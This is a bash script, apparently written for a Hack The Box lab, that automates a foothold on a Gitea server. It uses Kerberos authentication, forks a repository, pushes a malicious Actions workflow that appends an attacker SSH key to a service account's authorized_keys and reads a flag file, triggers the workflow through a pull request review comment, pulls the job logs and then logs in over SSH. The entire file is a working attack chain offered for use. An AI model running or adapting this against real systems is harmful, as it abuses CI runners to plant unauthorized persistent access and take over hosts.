#!/usr/bin/env bash
#
# Automates: kinit -> keygen -> fork -> push workflow -> PR -> trigger ->
#            poll actions -> fetch logs -> ssh
#
# Usage: ./gitea_foothold.sh
#
# Adjust the CONFIG section below to match your environment.

set -euo pipefail

# ============ CONFIG ============
KRB_PRINCIPAL="josh@DARKZERO.EXT"
GITEA_URL="http://gitea.darkzero.ext:3000"
UPSTREAM_OWNER="DarkZero"
REPO="DarkZero-Campaigns"
KEY_PATH="./htb_key2"
WORKFLOW_PATH_LOCAL="/tmp/foothold2.yml"
WORKFLOW_PATH_REMOTE=".gitea/workflows/foothold.yml"   # will be URL-encoded below
TARGET_USER="svc-runner"           # remote user whose authorized_keys we persist to
TARGET_HOME="/home/svc-runner"     # remote home dir
FLAG_FILE="user.txt"               # file to cat in the workflow
SSH_TARGET="127.0.0.1"
POLL_ATTEMPTS=15
POLL_INTERVAL=2
# =================================

log()  { echo -e "\033[1;36m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
err()  { echo -e "\033[1;31m[-]\033[0m $*" >&2; }

need_bin() {
  command -v "$1" >/dev/null 2>&1 || { err "Missing required binary: $1"; exit 1; }
}
need_bin curl
need_bin jq
need_bin kinit
need_bin ssh-keygen
need_bin base64

# ---------- 1. Kerberos ticket ----------
log "Requesting Kerberos ticket for $KRB_PRINCIPAL"
if ! klist -s 2>/dev/null; then
  kinit "$KRB_PRINCIPAL"
else
  log "Existing valid ticket found, reusing it (run 'kdestroy' first to force re-auth)"
fi
klist | sed 's/^/    /'

# ---------- 2. SSH keypair ----------
if [[ -f "$KEY_PATH" ]]; then
  log "Key $KEY_PATH already exists, reusing it"
else
  log "Generating new ed25519 keypair at $KEY_PATH"
  ssh-keygen -t ed25519 -f "$KEY_PATH" -N ''
fi
PUBKEY=$(cat "${KEY_PATH}.pub")
ok "Public key: $PUBKEY"

# ---------- 3. Determine fork owner (whoami) ----------
log "Resolving Gitea username via /user"
ME=$(curl -s --negotiate -u : "$GITEA_URL/api/v1/user")
FORK_OWNER=$(echo "$ME" | jq -r '.login')
if [[ -z "$FORK_OWNER" || "$FORK_OWNER" == "null" ]]; then
  err "Could not resolve current Gitea user. Check kinit / negotiate auth."
  exit 1
fi
ok "Authenticated as: $FORK_OWNER"

# ---------- 4. Build workflow file ----------
log "Writing workflow file to $WORKFLOW_PATH_LOCAL"
cat > "$WORKFLOW_PATH_LOCAL" << EOF
name: foothold
on:
  pull_request_review_comment:
    types: [created]

jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 ${TARGET_HOME}/.ssh
          echo '${PUBKEY}' >> ${TARGET_HOME}/.ssh/authorized_keys
          chmod 600 ${TARGET_HOME}/.ssh/authorized_keys
          cat ${TARGET_HOME}/${FLAG_FILE}
EOF
cat "$WORKFLOW_PATH_LOCAL" | sed 's/^/    /'

# ---------- 5. Fork upstream repo (idempotent) ----------
log "Checking for existing fork under $FORK_OWNER"
FORK_CHECK=$(curl -s --negotiate -u : -w '\n%{http_code}' \
  "$GITEA_URL/api/v1/repos/$FORK_OWNER/$REPO")
FORK_HTTP=$(echo "$FORK_CHECK" | tail -1)

if [[ "$FORK_HTTP" == "200" ]]; then
  ok "Fork already exists at $FORK_OWNER/$REPO"
else
  log "Forking $UPSTREAM_OWNER/$REPO"
  FORK_RESP=$(curl -s --negotiate -u : -X POST \
    -H "Content-Type: application/json" \
    -d '{}' \
    "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/forks")
  FORK_FULLNAME=$(echo "$FORK_RESP" | jq -r '.full_name // empty')
  if [[ -z "$FORK_FULLNAME" ]]; then
    err "Fork failed: $FORK_RESP"
    exit 1
  fi
  ok "Forked to $FORK_FULLNAME"
  sleep 2  # give gitea a moment to finish setting up the fork
fi

# ---------- 6. Push (create or update) workflow file on fork ----------
ENC_PATH=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$WORKFLOW_PATH_REMOTE")
CONTENTS_URL="$GITEA_URL/api/v1/repos/$FORK_OWNER/$REPO/contents/$ENC_PATH"

log "Checking if workflow file already exists on fork"
EXISTING=$(curl -s --negotiate -u : "$CONTENTS_URL")
EXISTING_SHA=$(echo "$EXISTING" | jq -r '.sha // empty')

CONTENT_B64=$(base64 -w0 "$WORKFLOW_PATH_LOCAL")

if [[ -n "$EXISTING_SHA" ]]; then
  log "Updating existing file (sha=$EXISTING_SHA)"
  PUSH_RESP=$(curl -s --negotiate -u : -w '\n%{http_code}' -X PUT \
    -H "Content-Type: application/json" \
    -d "{\"content\":\"$CONTENT_B64\",\"message\":\"update workflow\",\"branch\":\"main\",\"sha\":\"$EXISTING_SHA\"}" \
    "$CONTENTS_URL")
else
  log "Creating new file"
  PUSH_RESP=$(curl -s --negotiate -u : -w '\n%{http_code}' -X POST \
    -H "Content-Type: application/json" \
    -d "{\"content\":\"$CONTENT_B64\",\"message\":\"add workflow\",\"branch\":\"main\"}" \
    "$CONTENTS_URL")
fi

PUSH_HTTP=$(echo "$PUSH_RESP" | tail -1)
PUSH_BODY=$(echo "$PUSH_RESP" | sed '$d')

if [[ "$PUSH_HTTP" != "200" && "$PUSH_HTTP" != "201" ]]; then
  err "Push failed (HTTP $PUSH_HTTP): $PUSH_BODY"
  exit 1
fi
ok "Workflow file pushed (HTTP $PUSH_HTTP)"

# ---------- 7. Find or create PR ----------
log "Checking for existing open PR from $FORK_OWNER:main"
OPEN_PRS=$(curl -s --negotiate -u : "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/pulls?state=open")
PR_NUMBER=$(echo "$OPEN_PRS" | jq -r --arg h "$FORK_OWNER:main" '.[] | select(.head.label==$h or (.head.ref=="main")) | .number' | head -1)

if [[ -n "$PR_NUMBER" && "$PR_NUMBER" != "null" ]]; then
  ok "Reusing existing PR #$PR_NUMBER"
  PR_INFO=$(curl -s --negotiate -u : "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/pulls/$PR_NUMBER")
  HEAD_SHA=$(echo "$PR_INFO" | jq -r '.head.sha')
else
  log "Creating new PR"
  PR_RESPONSE=$(curl -s --negotiate -u : -X POST \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"CI Update\",\"body\":\"trigger workflow\",\"head\":\"$FORK_OWNER:main\",\"base\":\"main\"}" \
    "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/pulls")
  PR_NUMBER=$(echo "$PR_RESPONSE" | jq -r '.number // empty')
  HEAD_SHA=$(echo "$PR_RESPONSE" | jq -r '.head.sha // empty')
  if [[ -z "$PR_NUMBER" ]]; then
    err "PR creation failed: $PR_RESPONSE"
    exit 1
  fi
  ok "Created PR #$PR_NUMBER (head sha $HEAD_SHA)"
fi

# ---------- 8. Trigger via submitted review comment ----------
log "Submitting review comment to trigger workflow"
TRIGGER_RESP=$(curl -s --negotiate -u : -w '\n%{http_code}' -X POST \
  -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\",\"body\":\"trigger\",\"commit_id\":\"$HEAD_SHA\"}" \
  "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/pulls/$PR_NUMBER/reviews")
TRIGGER_HTTP=$(echo "$TRIGGER_RESP" | tail -1)
if [[ "$TRIGGER_HTTP" != "200" ]]; then
  err "Trigger failed (HTTP $TRIGGER_HTTP): $(echo "$TRIGGER_RESP" | sed '$d')"
  exit 1
fi
ok "Review comment submitted, workflow should fire"

# ---------- 9. Poll for the new run ----------
log "Polling actions/tasks for a new 'foothold' run"
JOB_ID=""
for i in $(seq 1 "$POLL_ATTEMPTS"); do
  TASKS=$(curl -s --negotiate -u : "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/actions/tasks")
  RUN=$(echo "$TASKS" | jq -r --arg sha "$HEAD_SHA" \
    '.workflow_runs[] | select(.head_sha==$sha and .workflow_id=="foothold.yml")' | jq -s '.[0]')
  STATUS=$(echo "$RUN" | jq -r '.status // empty')
  if [[ -n "$STATUS" && "$STATUS" != "null" ]]; then
    RUN_ID=$(echo "$RUN" | jq -r '.id')
    ok "Found run id=$RUN_ID status=$STATUS (attempt $i)"
    if [[ "$STATUS" == "success" || "$STATUS" == "failure" ]]; then
      break
    fi
  else
    log "No matching run yet (attempt $i/$POLL_ATTEMPTS)"
  fi
  sleep "$POLL_INTERVAL"
done

if [[ -z "${RUN_ID:-}" ]]; then
  err "No workflow run appeared after polling. Check Actions is enabled on the repo/fork."
  exit 1
fi

# ---------- 10. Fetch logs (job ids don't always match run ids, so try a small range) ----------
log "Fetching logs"
FOUND_LOGS=""
for jid in "$RUN_ID" $((RUN_ID+1)) $((RUN_ID-1)); do
  [[ "$jid" -lt 1 ]] && continue
  L=$(curl -s --negotiate -u : "$GITEA_URL/api/v1/repos/$UPSTREAM_OWNER/$REPO/actions/jobs/$jid/logs")
  if ! echo "$L" | grep -q '"message":"not found"'; then
    ok "Logs (job id $jid):"
    echo "$L"
    FOUND_LOGS="yes"
    break
  fi
done
[[ -z "$FOUND_LOGS" ]] && err "Could not fetch logs automatically — check the Actions tab in the Gitea UI."

# ---------- 11. SSH in ----------
log "Attempting SSH as $TARGET_USER"
chmod 600 "$KEY_PATH"
ssh -o StrictHostKeyChecking=accept-new -i "$KEY_PATH" "${TARGET_USER}@${SSH_TARGET}"